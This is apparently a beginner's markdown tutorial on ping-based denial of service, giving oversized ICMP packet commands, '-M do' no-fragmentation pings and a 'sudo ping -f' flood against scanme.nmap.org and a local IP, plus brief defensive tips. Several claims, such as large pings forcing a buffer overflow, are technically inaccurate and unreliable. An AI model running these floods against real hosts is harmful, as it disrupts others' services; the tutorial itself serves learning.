# 💥 Denial of Service (DoS) Attacks with Ping

This section demonstrates basic **Denial of Service (DoS)** techniques using large or manipulated **ICMP packets** (`ping`). These techniques can help test a system’s resilience against packet flooding or fragmentation-based disruptions.

> ⚠️ **Educational use only!** Never run these commands on unauthorized systems or networks.

---

## 🔍 Step 1: Resolve IP Address of Target

Use ping to resolve a website/domain to its IP:(`Nmap Scan-me website`)
![Dos](/docs/image/Dos1.png)

```bash
ping scanme.nmap.org
```
- Now use the IP (e.g., 45.33.32.156) for further tests.

## 📦 Step 2: ICMP Packet Flood with Custom Size
Basic command to test buffer size handling:

![Dos](/docs/image/Dos2.png)
```bash
ping scanme.nmap.org -s 80
```
- `-s` 80: Send 80-byte ICMP packets

Increasing this size sends more data in a single ping.

**🔁 Try increasing the size gradually to find the system's limit:**
![Dos](/docs/image/Dos3.png)
```bash
ping scanme.nmap.org -s 65506
ping scanme.nmap.org -s 65509
ping scanme.nmap.org -s 65508
ping scanme.nmap.org -s `65507`
```

## 🚫 Step 3: Prevent Packet Fragmentation with `-M do`
Some systems fragment large packets to handle them better. To simulate DoS more aggressively, you can prevent fragmentation:

```bash
ping scanme.nmap.org -s 2000 -M do
```
- `-M do` : Prevents fragmentation

- Will result in packet drop if the size exceeds system buffer

## 🧪 Step 4: Trial-and-Error for Max Packet Size

Continue increasing the size with -M do:
![Dos](/docs/image/Dos5.png)
```bash
ping scanme.nmap.org -s 1465 -M do
ping 192.168.1.1 -s 1464 -M do
```
⛔ If the system becomes unresponsive or replies stop, you may have hit the packet threshold or caused disruption.

![Dos](/docs/image/Dos4.png)
**Another Technique for PING DOS**
```bash
sudo ping -f ip_address
```
## 🛡️ Why DoS Works
Large ICMP packets may:

- Overflow the buffer

- Consume excessive processing time

- Exploit improperly configured firewalls or rate limits

## 🧷 Defensive Considerations (for Blue Teams)
- Limit ICMP rate using firewall (e.g., iptables)

- Drop fragmented packets

- Use IDS (like Snort) to detect unusual ping sizes

## ✅ Summary
**Technique	Command Example	Description**
- Normal ping	ping 192.168.1.1	Check if target is alive
  
- Custom packet size	ping -s 1000 192.168.1.1	Stress test with larger packets
  
- No fragmentation	ping -s 2000 -M do 192.168.1.1	Force buffer overflow simulation
- Trial-and-error attack	ping -s 5000 -M do 192.168.1.1	Maximize payload to check resistance
- TTL OS fingerprinting	ping 192.168.1.1	Check TTL in reply to guess OS

> 🧠 **Pro Tip**: Always perform DoS simulations in isolated environments like a VirtualBox lab or test subnet.
